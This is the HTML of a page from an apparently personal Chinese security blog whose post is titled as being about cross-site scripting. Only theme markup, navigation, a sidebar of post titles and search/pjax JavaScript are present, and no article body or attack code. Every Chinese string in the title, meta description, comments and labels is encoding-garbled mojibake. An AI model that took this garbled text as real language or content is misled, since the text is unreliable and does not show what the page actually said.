<!DOCTYPE html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="description" content="XSS
ÁÆÄËø∞
Cross-Site Scripting ÁÆÄÁß∞‰∏∫‚ÄúCSS‚ÄùÔºå‰∏∫ÈÅøÂÖç‰∏éÂâçÁ´ØÂè†ÊàêÊ†∑ÂºèË°®ÁöÑÁº©ÂÜô&quot;CSS&quot;ÂÜ≤Á™ÅÔºåÊïÖÂèàÁß∞XSS„ÄÇÂÆÉÊòØÊåáÊÅ∂ÊÑèÊîªÂáªËÄÖÂæÄwebÈ°µÈù¢‰∏≠ÊèíÂÖ•ÊÅ∂ÊÑèscript‰ª£Á†ÅÔºåÂΩìÁî®Êà∑ÊµèËßàËØ•È°µÈù¢Êó∂ÔºåÂµåÂÖ•ÂÖ∂‰∏≠ÁöÑs..." />
    <meta name="keywords" content="WebÂÆâÂÖ®" />
    <link rel="stylesheet" href="https://xmoct.github.io/media/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://xmoct.github.io/styles/main.css">
    <!-- ‰ª£Á†ÅÊ∏≤ÊüìÈ£éÊ†ºcss -->
    
    <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.18.1/build/styles/default.min.css">
    
    <!-- ‰ª£Á†ÅÈ´ò‰∫ÆÊèí‰ª∂ -->
    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.18.1/build/highlight.min.js"></script>
    <!-- ‰ª£Á†ÅÂ§çÂà∂Êèí‰ª∂ -->
    <script src="https://cdn.jsdelivr.net/gh/850552586/ericamcdn@0.1/js/clipboard.min.js"></script>
    <!-- live2dÊèí‰ª∂ -->
    <link rel="stylesheet" href="https://xmoct.github.io/media/css/live2d.css">
    <script src="https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js"></script>
    <!-- ÊúÄÊñ∞ÁâàÊú¨ÁöÑ Bootstrap Ê†∏ÂøÉ CSS Êñá‰ª∂ -->
    <link href="https://cdn.bootcdn.net/ajax/libs/font-awesome/5.13.1/css/all.min.css" rel="stylesheet">
    <!-- Êï∞Â≠¶ÂÖ¨Âºè -->
    
    <title>Ë∑®Á´ôËÑöÊú¨ÊîªÂáª</title>

    <!-- Â§ßÁ∫≤Á¥¢ÂºïcssË∞ÉÊï¥ -->
    
    <style>
        .markdownIt-TOC {
            margin-left: 28%;
            padding-left: 2px;
            width: 80%;
        }

        .markdownIt-TOC li {
            padding-left: 8%;
        }
    </style>
    
</head>

<body>
    <div id="landlord">
        <div class="message" style="opacity:0"></div>
        <canvas id="live2d" width="240" height="250" class="live2d"></canvas>
    </div>
    <div id="domainname" style="display:none">https://xmoct.github.io</div>
    <div id="content">
        <div>
            <!----------- ÁßªÂä®Á´ØÂØºËà™Ê†èüëá ----------------->
            <div id="bar">
                <style>
  .navmobile {
    z-index: 15;
    max-height: 40vh;
    overflow-y: scroll;
    overflow-x: hidden;
  }

  @media screen and (max-width: 1200px) {
    .navbar {
      max-width: 100vw;
    }
  }

  @media screen and (max-width:1200px) and (min-width: 768px) {
    @media (min-width: 768px) {
      .navbar-nav {
        float: right;
        margin: 0;
      }
    }
  }

  @media screen and (max-width:768px) {
    .mbapspan {
      padding: 0;
    }
  }
</style>
<div class="pjaxloading"  onclick="pjaxloadingClose()">
  <div class="loadingbackground"></div>
  <div id="loading">
    <div class="loading">
    </div>
  </div>
</div>
<nav class="navbar navbar-inverse navbar-fixed-top navmobile">
  <div class="container-fluid">
    <!-- Brand and toggle get grouped for better mobile display -->
    <div class="navbar-header">
      <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#barmenu"
        aria-expanded="false" id="barbutton">
        <span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
      <a data-pjax class="navbar-brand" style="color:white" href="https://xmoct.github.io">Moyv_blog&nbsp;&nbsp;|</a>
      <span class="navbar-brand mbapspan"><i id="mbaplayer" class="fa fa-play-circle-o" aria-hidden="true"
          style="font-size: 28px;top: 12px;position: absolute;" onclick="aplayerPlay();"></i></span>
    </div>

    <!-- Collect the nav links, forms, and other content for toggling -->
    <div class="collapse navbar-collapse" id="barmenu">
      <ul class="nav navbar-nav">
        
        
        <li>
          <a data-pjax href="/" style="color:white">
            È¶ñÈ°µ
          </a>
        </li>
        
        
        
        <li>
          <a data-pjax href="/archives" style="color:white">
            ÂΩíÊ°£
          </a>
        </li>
        
        
        
        <li>
          <a data-pjax href="/tags" style="color:white">
            Ê†áÁ≠æ
          </a>
        </li>
        
        
        
        <li>
          <a data-pjax href="/post/about" style="color:white">
            ÂÖ≥‰∫é
          </a>
        </li>
        
        
        
        
          
        <li><a data-pjax href="https://xmoct.github.io/friends" style="color:white">ÂèãÈìæ</a></li>

        
        </ul>
      </div><!-- /.navbar-collapse -->
    </div><!-- /.container-fluid -->
  </nav>


  <!-- ÂºïÂÖ•jQueryÊ†∏ÂøÉjsÊñá‰ª∂ -->
  <script src="https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js"></script>
  <script>
    let btstate = false;
    var bt = $("#barbutton");
    var bm = $("#barmenu");
    bt.click(function () {
      dropdown();
    })
    function dropdown() {
      console.log(btstate);
      //‰∏ãÊãâ
      if (btstate == false) {
        bt.removeClass("collapsed");
        bt.attr("aria-expanded", "true");
        bm.attr("aria-expanded", "true")
        bm.fadeIn(700);
        btstate = true;
      }
      else {
        bt.addClass("collapsed");
        bt.attr("aria-expanded", "false");
        bm.removeClass("in");
        bm.hide();
        bm.attr("aria-expanded", "false");
        btstate = false;
      }
    }
  </script> 
            </div>
            <!----------- ÁßªÂä®Á´ØÂØºËà™Ê†èüëÜ ----------------->

            <!--------------- pcÁ´ØËèúÂçïÊ†èüëá ---------------->
            <div class="side"><head>
    <link rel="stylesheet" href="https://xmoct.github.io/media/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://xmoct.github.io/styles/main.css">
    
    <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.18.1/build/styles/default.min.css">
    
    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.18.1/build/highlight.min.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/850552586/ericamcdn@0.1/js/clipboard.min.js"></script>
    <link rel="stylesheet" href="https://xmoct.github.io/media/css/live2d.css">
    <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
    <!-- ÊúÄÊñ∞ÁâàÊú¨ÁöÑ Bootstrap Ê†∏ÂøÉ CSS Êñá‰ª∂ -->
    <link href="https://cdn.bootcdn.net/ajax/libs/font-awesome/5.13.1/css/all.min.css" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
    <!-- fancybox -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
    <script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>


    <!--------- Êï∞Â≠¶ÂÖ¨Âºèüëá---- -->
    
    <!--------- Êï∞Â≠¶ÂÖ¨ÂºèüëÜ----------------- -->
    <!--------- daovocieÂäüËÉΩüëá ------------------->
    
    <!--------- daovocieÂäüËÉΩüëÜ ------------------->
    <!-- -----------------twikooËØÑËÆ∫Á≥ªÁªüÂºïÂÖ•üëá --------->
    <script src="https://cdn.jsdelivr.net/npm/twikoo@1.3.1/dist/twikoo.all.min.js"></script>
    <!-- -----------------twikooËØÑËÆ∫Á≥ªÁªüÂºïÂÖ•üëÜ --------->
    <!---------------- leancloud api ÂäüËÉΩ‰æùËµñÂºïÂÖ•üëá -------->
    <script src="https://cdn.jsdelivr.net/npm/leancloud-storage@3.13.0/dist/av-min.js"></script>
    <!---------------- leancloud api ÂäüËÉΩ‰æùËµñÂºïÂÖ•üëÜ -------->
    <!------------------ valineËØÑËÆ∫Á≥ªÁªüÂºïÂÖ•üëá ------------------>
    <script src="https://xmoct.github.io/media/js/valine.min.js"></script>
    <!------------------ valineËØÑËÆ∫Á≥ªÁªüÂºïÂÖ•üëÜ ------------------>
    <!---------------- ‰ªäÊó•ËØóËØçapiÂäüËÉΩ‰æùËµñüëá ----------------------->
    <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
    <!---------------- ‰ªäÊó•ËØóËØçapiÂäüËÉΩ‰æùËµñüëÜ ----------------------->
    <!---------------- ‰ªäÊó•ËØóËØçapiÂäüËÉΩ‰æùËµñüëá ----------------------->
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/ispeak-bber/ispeak-bber.min.js" charset="utf-8"></script>
    <!---------------- ÂìîÂìîÂäüËÉΩ‰æùËµñüëÜ ----------------------->


</head>

<style>
    body {
        overflow-x: hidden;
        height: 100vh;
        overflow-y: scroll;
        cursor: url("https://xmoct.github.io/media/images/mouse_cursor.png"), auto
    }
</style>

<body>
    <!--=------ È°µÈù¢Âä†ËΩΩÂä®ÊÄÅÁîªÈù¢üëá --------------->
    <div class="pjaxloading" onclick="pjaxloadingClose()">
        <div class="loadingbackground"></div>
        <div id="loading-aname">
            <div class="loading-aname">
            </div>
        </div>
    </div>
    <!--=------ È°µÈù¢Âä†ËΩΩÂä®ÊÄÅÁîªÈù¢üëÜ --------------->

    <!--------------- Â∑¶‰æßËèúÂçïÊ†èüëá ------------------------>
    
    <div id=side>
        <div class="r_m_div">
            <a onclick="showAaplayer()"><i style="font-size: 20px;"><img
                        src='https://xmoct.github.io/media/images/music.png' alt="Èü≥‰πêÊí≠ÊîæÂô®" class="musicbtn"></i></a>
        </div>
        <div class="avatar-border">
            <img src="https://xmoct.github.io/images/avatar.png?v=1690609173162" class="avatar">
        </div>
        <div class="sitename">Moyv_blog</div>
        <span class="description" data-text='["ÁîüÂâç‰ΩïÂøÖ‰πÖÁù°ÔºåÊ≠ªÂêéÂøÖÂÆöÈïøÁú†"]'>&nbsp;</span>
        <div class="siteinfocontainer">
            <span class="siteinfo">ÊñáÁ´†</span>
            <span class="siteinfo">Ê†áÁ≠æ</span>
        </div>
        <div class="siteinfocontainer">
            <span class="siteinfo" id="siteinfo-postsnum"></span>
            <span class="siteinfo">5</span>
        </div>
        
        <div class="search">
            <!-- <input type="text" class="search-input" placeholder="Ê†áÈ¢òÊêúÁ¥¢(‚óè'‚ó°'‚óè)" /> -->
            <input type="text" class="search-input" placeholder="Ê†áÈ¢òÊêúÁ¥¢ ‚öÜ_‚öÜ „Å§‚ô°">
            <div class="search-results"></div>
        </div>
        
    <div class="share-button">
        <span></span>
        
        
        
        
        
        
        
        
    </div>
    <div id="qq" style="display:none"></div>
    <!------------ Âä†ËΩΩËèúÂçïÊåâÈíÆüëá ------------------------->
    <div class="menucontainer">
        
        
        <div class="mchocie description">
            <a data-pjax href="/" class="menubutton" style="margin-right: 15px;">
                <i><img class="icon menuicon" src="" alt="È¶ñÈ°µ"></i>&nbsp;<span
                    data-text="È¶ñÈ°µ">È¶ñÈ°µ</span>
            </a>
        </div>
        
        
        
        <div class="mchocie description">
            <a data-pjax href="/archives" class="menubutton" style="margin-right: 15px;">
                <i><img class="icon menuicon" src="" alt="ÂΩíÊ°£"></i>&nbsp;<span
                    data-text="ÂΩíÊ°£">ÂΩíÊ°£</span>
            </a>
        </div>
        
        
        
        <div class="mchocie description">
            <a data-pjax href="/tags" class="menubutton" style="margin-right: 15px;">
                <i><img class="icon menuicon" src="" alt="Ê†áÁ≠æ"></i>&nbsp;<span
                    data-text="Ê†áÁ≠æ">Ê†áÁ≠æ</span>
            </a>
        </div>
        
        
        
        <div class="mchocie description">
            <a data-pjax href="/post/about" class="menubutton" style="margin-right: 15px;">
                <i><img class="icon menuicon" src="" alt="ÂÖ≥‰∫é"></i>&nbsp;<span
                    data-text="ÂÖ≥‰∫é">ÂÖ≥‰∫é</span>
            </a>
        </div>
        
        

        
        
        
        <div class="mchocie description">
            <a data-pjax href="https://xmoct.github.io/friends" class="menubutton" style="margin-right: 15px;">
                <i><img class="icon menuicon" src="" alt="Âèã‰∫∫Â∏ê"></i>&nbsp;<span data-text="Âèã‰∫∫Â∏ê">Âèã‰∫∫Â∏ê</span>
            </a>
        </div>
        
        <!--  -->
    </div>
    <!------------ Âä†ËΩΩËèúÂçïÊåâÈíÆüëÜ ------------------------->
    <hr>
    <style>
    .copyright {
        font-size: 15px;
        color: #d9d9d9;
    }


    @media screen and (min-width: 1200px) {
        .foot {
            width: 100%;
            height: 130px;
        }
    }

    @media screen and (max-width: 1200px) {
        .foot {
            display: none;
        }
    }
</style>

<body>
    <div class="foot">
        <div id="footinfo">Powered by <a href="https://github.com/xmoct" target="_blank">Â¢®ÁæΩ</a> | Theme: <a
                href="https://github.com/850552586/gridea-theme-fog">Fog</a>
            <div>
                
            </div>
            <div>
                
            </div>
            <div class="copyright" style="color:white;text-align: center;">Copyright ¬© 2020  Â§áÊ°àÂè∑: ÈÑÇICPÂ§á...Âè∑
            </div>
        </div>



    </div>
</body>

    </div>

    <img class="moon" src="https://xmoct.github.io/media/images/moon.png" onclick="moonlight()">
    <script src="https://xmoct.github.io/media/js/wordshow.js"></script>
    
    <!--------------- Â∑¶‰æßËèúÂçïÊ†èüëÜ ------------------------>

    <!----------------- È°∂ÈÉ®ËèúÂçïÊ†èüëá ------------------------>
    
    <!----------------- È°∂ÈÉ®ËèúÂçïÊ†èüëÜ ------------------------>

<!--Ê†∏ÂøÉÂäüËÉΩÂä†ËΩΩ-->
<script src="https://xmoct.github.io/media/js/mainfunc.js"></script>

<!------------- Fog1.0ÁâàÊú¨ÂΩ©Ëõãüëá -------------->
    <!-- <section id="terrestrial" class="popup">
        <a href="#" class="back">&lt; back</a>
    </section>

    <div class="flycontainer">
        <div class="flyword">Âæ°È£éÈ£ûË°å‰∏≠...</div>
    </div>

    <script>
        $("#fog_go").click(function(){fog_go()});
        async function fog_go(){
            $(".bars").hide()
            $("#live2d").hide()
            await sleep(3000);
            $(".flycontainer").css("display","flex");
            $(".popup").fadeOut(500)
            await sleep(2000);
            var sitename = "Moyv_blog";
            getFogUser(sitename);
        }

        function fog_goregis(){
            var sitename = "Moyv_blog";
            var siteurl = "https://xmoct.github.io";
            regisFogUser(sitename,siteurl);
        }
        fog_goregis();
    </script> -->
<!------------- Fog1.0ÁâàÊú¨ÂΩ©ËõãüëÜ -------------->
<script>
    function change_topmenu(){
        tmcolor = "antiquewhite"
        tsnamecolor = "antiquewhite"
        $(".navbar-inverse .navbar-nav>li>a").css("color",tmcolor)
        $(".navbar-inverse .navbar-brand").css("color",tsnamecolor)
        $(".navbar-fixed-top").css("border-radius","0 0 10px 10px")
    }
</script>

<!------ Ê†πÊçÆËá™ÂÆö‰πâÈÖçÁΩÆÂ£∞ÊòéÂèòÈáèüëá --------------------->
    
    <script>
        var postnumChoice = false
    </script>
    
    
    <script>
        var shareChoice = false
    </script>
    
    
    <script>
        var donateChoice = false
    </script>
    
    
    <script>
        var searchChoice = true
    </script>
    
    <script>let postsnum = 0;</script>
    <div id="side-posttitle" style="display: none;">
    
    
    ÈÄªËæëÊºèÊ¥û
    <script>
        postsnum += 1
    </script>
    
    
    
    3. ‰ø°ÊÅØÊî∂ÈõÜ
    <script>
        postsnum += 1
    </script>
    
    
    
    ÂÆûÊàòSRCÊåñÊéò
    <script>
        postsnum += 1
    </script>
    
    
    
    Ëá™Âä®ÂåñÊâ´ÊèèÂ∑•ÂÖ∑
    <script>
        postsnum += 1
    </script>
    
    
    
    ÂëΩ‰ª§ÊâßË°åÂíå‰ª£Á†ÅÊâßË°å
    <script>
        postsnum += 1
    </script>
    
    
    
    Êñá‰ª∂‰∏ä‰º†ÂíåÊñá‰ª∂ÂåÖÂê´
    <script>
        postsnum += 1
    </script>
    
    
    
    Ë∑®Á´ôËÑöÊú¨ÊîªÂáª
    <script>
        postsnum += 1
    </script>
    
    
    
    C++ÁºñÁ®ã2
    <script>
        postsnum += 1
    </script>
    
    
    
    C++ÁºñÁ®ã1
    <script>
        postsnum += 1
    </script>
    
    
    
    
    
    CDNÁªïËøá
    <script>
        postsnum += 1
    </script>
    
    
    
    ÊùÉÈôêÁª¥ÊåÅ
    <script>
        postsnum += 1
    </script>
    
    
    
    
    
    
    
    ‰ª£Á†ÅÂÆ°ËÆ°
    <script>
        postsnum += 1
    </script>
    
    
    
    ‰∏ªÂä®‰ø°ÊÅØÊî∂ÈõÜ
    <script>
        postsnum += 1
    </script>
    
    
    
    Ë¢´Âä®‰ø°ÊÅØÊî∂ÈõÜ
    <script>
        postsnum += 1
    </script>
    
    
    
    ÂÖ≥‰∫é
    <script>
        postsnum += 1
    </script>
    
    
    
    Hello Gridea 
    <script>
        postsnum += 1
    </script>
    
    
    </div>
    
        <script>
            var menupos = 'left';
            $("#siteinfo-postsnum").html(postsnum);
        </script>
    
    <script>
        let commentsHide = false
    </script>
    <!------ Ê†πÊçÆËá™ÂÆö‰πâÈÖçÁΩÆÂ£∞ÊòéÂèòÈáèüëÜ --------------------->


    <!----------Ê†πÊçÆËá™ÂÆö‰πâÈÖçÁΩÆËÆæÁΩÆÂõæÊ†á‰ø°ÊÅØüëá---------->
    <script>
        var icondict = new Array();
    </script>
    
        
    
    <!----------Ê†πÊçÆËá™ÂÆö‰πâÈÖçÁΩÆËÆæÁΩÆÂõæÊ†á‰ø°ÊÅØüëÜ---------->
</body>

<script src="https://xmoct.github.io/media/share/dist/Share.js"></script>
<!-- È°µÈù¢pjaxÊµãËØï -->
<script src="https://cdn.bootcdn.net/ajax/libs/jquery.pjax/2.0.1/jquery.pjax.js"></script>
<!--Á°Æ‰øùjQueryÂ∑≤ÁªèÂú®Ê≠§‰πãÂâçÂä†ËΩΩ-->
<!-- <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script> -->
<script src="https://xmoct.github.io/media/js/all-pjax.js"></script>
<script>
    //-------------------------------ËØ¥ËØ¥ÂäüËÉΩüëá--------------------------------------
    let talksall = [];
    let talks = [];
    let talkindex = 0;
    get();

    function get() {
        var t = JSON.parse('[]');
        talkindex = t.length - 1;
        for (var i = 0; i <= t.length - 1; i++) {
            var d = {};
            d["time"] = t[i].time;
            d["author"] = t[i].author;
            d["text"] = t[i].text;
            d["img"] = t[i].img;
            talksall.push(d);
        }
    }

    function add() {
        for (var i = talkindex; i >= 0 && i > talkindex - 3; i--) {
            talks.push(talksall[i]);
        }
        talkindex = (talkindex - 3) >= 0 ? (talkindex - 3) : -1;
        if (talkindex < 0) $("#getmorebt").hide();
        show();
    }

    function show() {
        var talkT = document.getElementById("talkContainer");
        talkT.innerHTML = "";
        for (var i = 0; i < talks.length; i++) {
            if (talks[i].img != '') {
                talkT.innerHTML += '\
            <div class="talk" v-for="t in talks"> \
                <span data-fancybox="images" href="' + talks[i].img + '"><img src="' + talks[i].img + '" class="talkimg"></span> \
                <div class="ainfo">\
                    <div class="ainfo-intro">\
                        <div class="author">' + talks[i].author + '</div>¬∑\
                        <div class="time">' + talks[i].time + '</div>\
                    </div>\
                </div>\
                <div class="talkcontent">' + talks[i].text + '\
                </div\>\
            ';
            } else {
                talkT.innerHTML += '\
            <div class="talk" v-for="t in talks"> \
                <div class="ainfo">\
                    <div class="ainfo-intro">\
                        <div class="author">' + talks[i].author + '</div>¬∑\
                        <div class="time">' + talks[i].time + '</div>\
                    </div>\
                </div>\
                <div class="talkcontent">' + talks[i].text + '\
                </div\>\
            ';
            }
        }
    }
    //-------------------------------ËØ¥ËØ¥ÂäüËÉΩüëÜ--------------------------------------
</script>

<!---->
<script>
    function replaceAvatar() {
        twikoo_avatar = $(".tk-avatar-img");
        for (var i = 0; i < twikoo_avatar.length; i++) {
            var asrc = twikoo_avatar.eq(i).attr('src');
            if (asrc.search('cn.gravatar.com') != -1) {
                twikoo_avatar.eq(i).attr('src', 'https://xmoct.github.io/media/images/comavatar.png');
            }
        }
    }

    function showWechat() {
        var wechat = '';
        alert("Âçö‰∏ªÂæÆ‰ø°Âè∑Ôºö" + wechat);
        return false;
    }
</script>

<script>
    /**
     * https://github.com/tangkaichuan/gridea-search
     */
    // Ê£ÄÊü•ÁºìÂ≠òÊòØÂê¶ÊúÄÊñ∞
    function checkCache() {
        var caches_postsnum = localStorage.getItem("postsnum");
        var pt = document.getElementById("side-posttitle").innerHTML;
        pt = pt.replace(/\s+/g, '').replace(/<script>.*?<\/script>/gi, "")
        var ptlen = pt.length;
        var ptlen_storage = localStorage.getItem("poststitlelen");
        if (caches_postsnum != postsnum || ptlen != ptlen_storage) {
            console.log("Êõ¥Êñ∞ÁºìÂ≠ò");
            return false
        }
        return true;
    }

    (function () {
        var CACHES = checkCache()
        if (!CACHES) {
            var NOW = Date.now()
            var API_CONTENT = '../api-content/index.html' + '?_=' + NOW
            preload(API_CONTENT);
            getContents(show_getContentresult);
        }

        function show_getContentresult(data) {
            console.log("Ëé∑ÂèñÊàêÂäü");
            var postslen = data["posts"].length;
            localStorage.setItem('postsnum', postslen);
            var poststitlelen = 0;
            var pt = document.getElementById("side-posttitle").innerHTML;
            pt = pt.replace(/\s+/g, '').replace(/<script>.*?<\/script>/gi, "");
            localStorage.setItem('poststitlelen', pt.length);
        }



        // preload
        function preload(url) {
            var preloadLink = document.createElement('link')
            preloadLink.href = url
            preloadLink.rel = 'preload'
            preloadLink.as = 'fetch'
            preloadLink.crossOrigin = 'anonymous'
            document.head.appendChild(preloadLink)
        }

        // ÂºÇÊ≠• GET ËØ∑Ê±Ç
        function get(obj) {
            var xhr = new XMLHttpRequest()
            xhr.open('get', obj.url, true)
            xhr.send(null)
            xhr.onreadystatechange = function () {
                // ÂºÇÊ≠•ËØ∑Ê±ÇÔºöÂìçÂ∫îÁä∂ÊÄÅ‰∏∫4ÔºåÊï∞ÊçÆÂä†ËΩΩÂÆåÊØï
                if (xhr.readyState === 4) {
                    if (xhr.status === 200) {
                        obj.success(xhr.responseText)
                    } else {
                        obj.error(xhr.status)
                    }
                }
            }
        }

        // Ëé∑ÂèñÂçöÂÆ¢ÂÖ®Êñá api
        function getContents(callback) {
            if (CACHES) {
                callback(CACHES.contents)
            } else {
                get({
                    url: API_CONTENT,
                    success: function (data) {
                        callback(JSON.parse(data));
                        localStorage.setItem('ContentsCache', data);
                        getStorageContent();
                    }
                })
            }
        }
    })()
    //------------------------Ê†∏ÂøÉÂäüËÉΩ--pjaxÂÖ®Â±ÄÊ∏≤Êüìüëá-------------------
    let talkinit = false;
    $(document).pjax('a[data-pjax]', '#main', {
        fragment: '#main',
        timeout: 8000
    }).on('pjax:complete', function () {
        //‰ª£Á†ÅÂùóÈ´ò‰∫ÆÊ∏≤Êüì
        document.querySelectorAll('pre code').forEach((block) => {
            hljs.highlightBlock(block);
        });
        //ÊñáÁ´†ÁÉ≠Â∫¶
        if(postnumChoice){
            getHotnum();
        }
        //ÊñáÁ´†Á¥¢Âºï
        toginit();
        //Ê∏ÖÁ©∫ÊêúÁ¥¢Ê†è
        if (searchChoice) {
            searchInit();
            searchInput.value = "";
        }
        var pl = window.location.pathname;
        //ËØ¥ËØ¥Êõ¥Êñ∞
        if (pl.search("talk") != -1 && !talkinit) {
            add();
            talkinit = true;
        } else if (pl.search("talk") != -1) {
            show();
        }
        if (pl.search("post") != -1) {
            if (shareChoice)
                shareInit();
            if (donateChoice)
                donateInit();
            if ("default" == "default"&&!commentsHide) {
                $("#comment").hide()
                commentsHide = true
            }
            lazyload();
            codeinit();
            if ("default" == "twikoo") {
                //twikooÂ§¥ÂÉèÊõ¥Êç¢
                setTimeout(replaceAvatar, 3000);
                setTimeout(replaceAvatar, 8000); //ÈÉ®ÂàÜÂçö‰∏ªÁ´ôÁÇπÈÄüÂ∫¶Âä†ËΩΩËøáÊÖ¢ÔºåÂÜçÊ∑ªÂä†‰∏Ä‰∏™Âª∂Ëøü
            }
        }
        if (btstate == true)
            dropdown();
    }).on('pjax:start', function () {
        $(".pjaxloading").fadeIn(50);
    }).on('pjax:end', function () {
        $(".pjaxloading").fadeOut(50);
    });
    //------------------------Ê†∏ÂøÉÂäüËÉΩ--pjaxÂÖ®Â±ÄÊ∏≤ÊüìüëÜ-------------------

    //-------------------------------------------------ÊêúÁ¥¢
    // Ëé∑ÂèñÊêúÁ¥¢Ê°Ü„ÄÅÊêúÁ¥¢ÊåâÈíÆ„ÄÅÊ∏ÖÁ©∫ÊêúÁ¥¢„ÄÅÁªìÊûúËæìÂá∫ÂØπÂ∫îÁöÑÂÖÉÁ¥†
    if (searchChoice) {
        var searchInput = document.querySelector('.search-input');
        var searchResults = document.querySelector('.search-results');
    }
    // Áî≥Êòé‰øùÂ≠òÊñáÁ´†ÁöÑÊ†áÈ¢ò„ÄÅÈìæÊé•„ÄÅÂÜÖÂÆπÁöÑÊï∞ÁªÑÂèòÈáè
    var searchValue = '',
        arrItems = [],
        arrLinks = [],
        arrTitles = [],
        arrContents = [],
        arrResults = [],
        indexItem = [],
        itemLength = 0;
    var tmpDiv = document.createElement('div');
    tmpDiv.className = 'result-item';


    function getStorageContent() {
        var data = localStorage.getItem('ContentsCache');
        data = JSON.parse(data);
        posts = data["posts"];
        for (var i = 0; i < posts.length; i++) {
            arrLinks[i] = posts[i].link;
            arrTitles[i] = posts[i].title;
            arrContents[i] = posts[i].content;
            itemLength++;
        }
    }
    if (checkCache())
        getStorageContent();
    // ËæìÂÖ•Ê°ÜÂÜÖÂÆπÂèòÂåñÂêéÂ∞±ÂºÄÂßãÂåπÈÖçÔºåÂèØ‰ª•‰∏çÁî®ÁÇπÊåâÈíÆ
    // ÁªèÊµãËØïÔºåonkeydown, onchange Á≠âÊñπÊ≥ïÊïàÊûú‰∏çÂ§™ÁêÜÊÉ≥Ôºå
    // Â≠òÂú®ËæìÂÖ•Âª∂ËøüÁ≠âÈóÆÈ¢òÔºåÊúÄÂêéÂèëÁé∞Ëß¶Âèë input ‰∫ã‰ª∂ÊúÄÁêÜÊÉ≥Ôºå
    // Âπ∂‰∏îÂèØ‰ª•Â§ÑÁêÜ‰∏≠ÊñáËæìÂÖ•Ê≥ïÊãºÂÜôÁöÑÂèòÂåñ
    searchInput.oninput = function () {
        setTimeout(searchConfirm, 0);
    }
    searchInput.onfocus = function () {
        searchResults.style.display = 'block';
    }

    function searchConfirm() {
        if (searchInput.value == '') {
            searchResults.style.display = 'none';
        } else if (searchInput.value.search(/^\s+$/) >= 0) {
            // Ê£ÄÊµãËæìÂÖ•ÂÄºÂÖ®ÊòØÁ©∫ÁôΩÁöÑÊÉÖÂÜµ
            searchInit();
            var itemDiv = tmpDiv.cloneNode(true);
            itemDiv.innerText = 'ËØ∑ËæìÂÖ•ÊúâÊïàÂÜÖÂÆπ...';
            searchResults.appendChild(itemDiv);
        } else {
            // ÂêàÊ≥ïËæìÂÖ•ÂÄºÁöÑÊÉÖÂÜµ
            searchInit();
            searchValue = searchInput.value;
            // Âú®Ê†áÈ¢ò„ÄÅÂÜÖÂÆπ‰∏≠Êü•Êâæ
            searchMatching(arrTitles, arrContents, searchValue);
        }
    }

    // ÊØèÊ¨°ÊêúÁ¥¢ÂÆåÊàêÂêéÁöÑÂàùÂßãÂåñ
    function searchInit() {
        arrResults = [];
        indexItem = [];
        searchResults.innerHTML = '';
        searchResults.style.display = 'block';
    }

    function searchMatching(arr1, arr2, input) {
        // ÂøΩÁï•ËæìÂÖ•Â§ßÂ∞èÂÜô
        input = new RegExp(input, 'i');
        var step = 10;
        // Âú®ÊâÄÊúâÊñáÁ´†Ê†áÈ¢ò„ÄÅÂÜÖÂÆπ‰∏≠ÂåπÈÖçÊü•ËØ¢ÂÄº
        for (i = 0; i < itemLength; i++) {
            var indexContent = arr2[i].search(input);
            //Ê†áÈ¢òÂåπÈÖç
            if (arr1[i].search(input) != -1) {
                indexItem.push(i); // ‰øùÂ≠òÂåπÈÖçÂÄºÁöÑÁ¥¢Âºï
                if (indexContent != -1) {
                    startindex = (indexContent - step) >= 0 ? (indexContent - step) : 0;
                    var searchcontent = arr2[i].slice(indexContent - step, indexContent + 5)
                    arrResults.push("....." + searchcontent + ".....");
                } else
                    arrResults.push("");
            }
            //ÂÜÖÂÆπÂåπÈÖç
            else if (indexContent != -1) {
                indexItem.push(i); // ‰øùÂ≠òÂåπÈÖçÂÄºÁöÑÁ¥¢Âºï

                startindex = (indexContent - step) >= 0 ? (indexContent - step) : 0;
                var searchcontent = arr2[i].slice(indexContent - step, indexContent + 5)
                arrResults.push("....." + searchcontent + ".....");
            }
        }

        // ËæìÂá∫ÊÄªÂÖ±ÂåπÈÖçÂà∞ÁöÑÊï∞ÁõÆ
        var totalDiv = tmpDiv.cloneNode(true);
        totalDiv.innerHTML = '<b>ÊÄªÂåπÈÖçÔºö' + indexItem.length + ' È°π<hr></b>';
        searchResults.appendChild(totalDiv);

        // Êú™ÂåπÈÖçÂà∞ÂÜÖÂÆπÁöÑÊÉÖÂÜµ
        if (indexItem.length == 0) {
            var itemDiv = tmpDiv.cloneNode(true);
            itemDiv.innerText = 'Êú™ÂåπÈÖçÂà∞ÂÜÖÂÆπ...';
            searchResults.appendChild(itemDiv);
        }

        // Â∞ÜÊâÄÊúâÂåπÈÖçÂÜÖÂÆπËøõË°åÁªÑÂêà
        for (i = 0; i < arrResults.length; i++) {
            var itemDiv = tmpDiv.cloneNode(true);
            itemDiv.innerHTML = '<a data-pjax class="searchresults" href="' + arrLinks[indexItem[i]] + '"><b>[' +
                arrTitles[indexItem[i]] +
                ']</b><p>' + arrResults[i] + '</p></a><hr />';
            searchResults.appendChild(itemDiv);
        }
    }
</script>



